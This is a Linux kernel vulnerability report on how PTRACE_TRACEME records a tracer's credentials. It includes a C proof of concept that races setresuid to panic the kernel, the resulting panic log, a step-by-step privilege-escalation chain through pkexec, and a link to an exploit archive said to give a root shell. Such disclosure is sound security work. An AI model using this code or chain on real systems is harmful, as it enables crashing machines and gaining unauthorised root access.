@@ -1,0 +1,196 @@
+== Summary ==
+This bug report describes two issues introduced by commit 64b875f7ac8a ("ptrace:
+Capture the ptracer's creds not PT_PTRACE_CAP", introduced in v4.10 but also
+stable-backported to older versions). I will send a suggested patch in a minute
+("ptrace: Fix ->ptracer_cred handling for PTRACE_TRACEME").
+
+When called for PTRACE_TRACEME, ptrace_link() would obtain an RCU reference
+to the parent's objective credentials, then give that pointer to
+get_cred(). However, the object lifetime rules for things like struct cred
+do not permit unconditionally turning an RCU reference into a stable
+reference.
+
+PTRACE_TRACEME records the parent's credentials as if the parent was acting
+as the subject, but that's not the case. If a malicious unprivileged child
+uses PTRACE_TRACEME and the parent is privileged, and at a later point, the
+parent process becomes attacker-controlled (because it drops privileges and
+calls execve()), the attacker ends up with control over two processes with
+a privileged ptrace relationship, which can be abused to ptrace a suid
+binary and obtain root privileges.
+
+
+== Long bug description ==
+While I was trying to refactor the cred_guard_mutex logic, I stumbled over the
+following issues:
+
+ptrace relationships can be set up in two ways: Either the tracer attaches to
+another process (PTRACE_ATTACH/PTRACE_SEIZE), or the tracee forces its parent to
+attach to it (PTRACE_TRACEME).
+When a tracee goes through a privilege-gaining execve(), the kernel checks
+whether the ptrace relationship is privileged. If it is not, the
+privilege-gaining effect of execve is suppressed.
+The idea here is that a privileged tracer (e.g. if root runs "strace" on
+some process) is allowed to trace through setuid/setcap execution, but an
+unprivileged tracer must not be allowed to do that, since it could otherwise
+inject arbitrary code into privileged processes.
+
+In the PTRACE_ATTACH/PTRACE_SEIZE case, the tracer's credentials are recorded at
+the time it calls PTRACE_ATTACH/PTRACE_SEIZE; later, when the tracee goes
+through execve(), it is checked whether the recorded credentials are capable
+over the tracee's user namespace.
+But in the PTRACE_TRACEME case, the kernel also records _the tracer's_
+credentials, even though the tracer is not requesting the operation. There are
+two problems with that.
+
+
+First, there is an object lifetime issue:
+ptrace_traceme() -> ptrace_link() grabs __task_cred(new_parent) in an RCU
+read-side critical section, then passes the creds to __ptrace_link(), which
+calls get_cred() on them. If the parent concurrently switches its creds (e.g.
+via setresuid()), the creds' refcount may already be zero, in which case
+put_cred_rcu() will already have been scheduled. The kernel usually manages to
+panic() before memory corruption occurs here using the following code in
+put_cred_rcu(); however, I think memory corruption would also be possible if
+this code races exactly the right way.
+
+        if (atomic_read(&cred->usage) != 0)
+                panic("CRED: put_cred_rcu() sees %p with usage %d\n",
+                      cred, atomic_read(&cred->usage));
+
+A simple PoC to trigger this bug:
+============================
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <signal.h>
+#include <sched.h>
+#include <err.h>
+#include <sys/prctl.h>
+#include <sys/types.h>
+#include <sys/ptrace.h>
+
+int grandchild_fn(void *dummy) {
+  if (ptrace(PTRACE_TRACEME, 0, NULL, NULL))
+    err(1, "traceme");
+  return 0;
+}
+
+int main(void) {
+  pid_t child = fork();
+  if (child == -1) err(1, "fork");
+
+  /* child */
+  if (child == 0) {
+    static char child_stack[0x100000];
+    prctl(PR_SET_PDEATHSIG, SIGKILL);
+    while (1) {
+      if (clone(grandchild_fn, child_stack+sizeof(child_stack), CLONE_FILES|CLONE_FS|CLONE_IO|CLONE_PARENT|CLONE_VM|CLONE_SIGHAND|CLONE_SYSVSEM|CLONE_VFORK, NULL) == -1)
+        err(1, "clone failed");
+    }
+  }
+
+  /* parent */
+  uid_t uid = getuid();
+  while (1) {
+    if (setresuid(uid, uid, uid)) err(1, "setresuid");
+  }
+}
+============================
+
+Result:
+============================
+[  484.576983] ------------[ cut here ]------------
+[  484.580565] kernel BUG at kernel/cred.c:138!
+[  484.585278] Kernel panic - not syncing: CRED: put_cred_rcu() sees 000000009e024125 with usage 1
+[  484.589063] CPU: 1 PID: 1908 Comm: panic Not tainted 5.2.0-rc7 #431
+[  484.592410] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.12.0-1 04/01/2014
+[  484.595843] Call Trace:
+[  484.598688]  <IRQ>
+[  484.601451]  dump_stack+0x7c/0xbb
+[...]
+[  484.607349]  panic+0x188/0x39a
+[...]
+[  484.622650]  put_cred_rcu+0x112/0x120
+[...]
+[  484.628580]  rcu_core+0x664/0x1260
+[...]
+[  484.646675]  __do_softirq+0x11d/0x5dd
+[  484.649523]  irq_exit+0xe3/0xf0
+[  484.652374]  smp_apic_timer_interrupt+0x103/0x320
+[  484.655293]  apic_timer_interrupt+0xf/0x20
+[  484.658187]  </IRQ>
+[  484.660928] RIP: 0010:do_error_trap+0x8d/0x110
+[  484.664114] Code: da 4c 89 ee bf 08 00 00 00 e8 df a5 09 00 3d 01 80 00 00 74 54 48 8d bb 90 00 00 00 e8 cc 8e 29 00 f6 83 91 00 00 00 02 75 2b <4c> 89 7c 24 40 44 8b 4c 24 04 48 83 c4 08 4d 89 f0 48 89 d9 4c 89
+[  484.669035] RSP: 0018:ffff8881ddf2fd58 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff13
+[  484.672784] RAX: 0000000000000000 RBX: ffff8881ddf2fdb8 RCX: ffffffff811144dd
+[  484.676450] RDX: 0000000000000007 RSI: dffffc0000000000 RDI: ffff8881eabc4bf4
+[  484.680306] RBP: 0000000000000006 R08: fffffbfff0627a02 R09: 0000000000000000
+[  484.684033] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000004
+[  484.687697] R13: ffffffff82618dc0 R14: 0000000000000000 R15: ffffffff810c99d5
+[...]
+[  484.700626]  do_invalid_op+0x31/0x40
+[...]
+[  484.707183]  invalid_op+0x14/0x20
+[  484.710499] RIP: 0010:__put_cred+0x65/0x70
+[  484.713598] Code: 48 8d bd 90 06 00 00 e8 49 e2 1f 00 48 3b 9d 90 06 00 00 74 19 48 8d bb 90 00 00 00 48 c7 c6 50 98 0c 81 5b 5d e9 ab 1f 08 00 <0f> 0b 0f 0b 0f 0b 0f 1f 44 00 00 55 53 48 89 fb 48 81 c7 90 06 00
+[  484.718633] RSP: 0018:ffff8881ddf2fe68 EFLAGS: 00010202
+[  484.722407] RAX: 0000000000000001 RBX: ffff8881f38a4600 RCX: ffffffff810c9987
+[  484.726147] RDX: 0000000000000003 RSI: dffffc0000000000 RDI: ffff8881f38a4600
+[  484.730049] RBP: ffff8881f38a4600 R08: ffffed103e7148c1 R09: ffffed103e7148c1
+[  484.733857] R10: 0000000000000001 R11: ffffed103e7148c0 R12: ffff8881eabc4380
+[  484.737923] R13: 00000000000003e8 R14: ffff8881f1a5b000 R15: ffff8881f38a4778
+[...]
+[  484.748760]  commit_creds+0x41c/0x520
+[...]
+[  484.756115]  __sys_setresuid+0x1cb/0x1f0
+[  484.759634]  do_syscall_64+0x5d/0x260
+[  484.763024]  entry_SYSCALL_64_after_hwframe+0x49/0xbe
+[  484.766441] RIP: 0033:0x7fcab9bb4845
+[  484.769839] Code: 0f 1f 44 00 00 48 83 ec 38 64 48 8b 04 25 28 00 00 00 48 89 44 24 28 31 c0 8b 05 a6 8e 0f 00 85 c0 75 2a b8 75 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 53 48 8b 4c 24 28 64 48 33 0c 25 28 00 00 00
+[  484.775183] RSP: 002b:00007ffe01137aa0 EFLAGS: 00000246 ORIG_RAX: 0000000000000075
+[  484.779226] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fcab9bb4845
+[  484.783057] RDX: 00000000000003e8 RSI: 00000000000003e8 RDI: 00000000000003e8
+[  484.787101] RBP: 00007ffe01137af0 R08: 0000000000000000 R09: 00007fcab9caf500
+[  484.791045] R10: fffffffffffff4d4 R11: 0000000000000246 R12: 00005573b2f240b0
+[  484.794891] R13: 00007ffe01137bd0 R14: 0000000000000000 R15: 0000000000000000
+[  484.799171] Kernel Offset: disabled
+[  484.802932] ---[ end Kernel panic - not syncing: CRED: put_cred_rcu() sees 000000009e024125 with usage 1 ]---
+============================
+
+
+The second problem is that, because the PTRACE_TRACEME case grabs the
+credentials of a potentially unaware tracer, it can be possible for a normal
+user to create and use a ptrace relationship that is marked as privileged even
+though no privileged code ever requested or used that ptrace relationship.
+This requires the presence of a setuid binary with certain behavior: It has to
+drop privileges and then become dumpable again (via prctl() or execve()).
+
+ - task A: fork()s a child, task B
+ - task B: fork()s a child, task C
+ - task B: execve(/some/special/suid/binary)
+ - task C: PTRACE_TRACEME (creates privileged ptrace relationship)
+ - task C: execve(/usr/bin/passwd)
+ - task B: drop privileges (setresuid(getuid(), getuid(), getuid()))
+ - task B: become dumpable again (e.g. execve(/some/other/binary))
+ - task A: PTRACE_ATTACH to task B
+ - task A: use ptrace to take control of task B
+ - task B: use ptrace to take control of task C
+
+Polkit's pkexec helper fits this pattern. On a typical desktop system, any
+process running under an active local session can invoke some helpers through
+pkexec (see configuration in /usr/share/polkit-1/actions, search for <action>s
+that specify <allow_active>yes</allow_active> and
+<annotate key="org.freedesktop.policykit.exec.path">...</annotate>).
+While pkexec is normally used to run programs as root, pkexec actually allows
+its caller to specify the user to run a command as with --user, which permits
+using pkexec to run a command as the user who executed pkexec. (Which is kinda
+weird... why would I want to run pkexec helpers as more than one fixed user?)
+
+I have attached a proof-of-concept that works on Debian 10 running a distro
+kernel and the XFCE desktop environment; if you use a different desktop
+environment, you may have to add a path to the `helpers` array in the PoC. When
+you compile and run it in an active local session, you should get a root shell
+within a second.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
